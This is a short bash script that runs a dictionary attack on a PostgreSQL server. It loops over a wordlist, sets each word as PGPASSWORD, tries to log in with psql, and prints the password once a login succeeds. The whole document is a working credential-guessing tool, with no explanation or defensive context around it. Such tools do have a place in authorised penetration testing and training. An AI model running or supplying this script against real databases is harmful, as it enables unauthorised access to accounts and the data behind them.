#!/bin/bash

user=$1
host=$2
dictionary=$3


for attempt in $(cat $dictionary)
do

    export PGPASSWORD=$attempt
    checking=$(psql -U $user -h $host -c "\q"  > /dev/null 2>&1)

    if [ $? -eq 0  ] 
    then
        echo "PASSWORD FOUND: [ $attempt ]"
        break
    fi
    
done

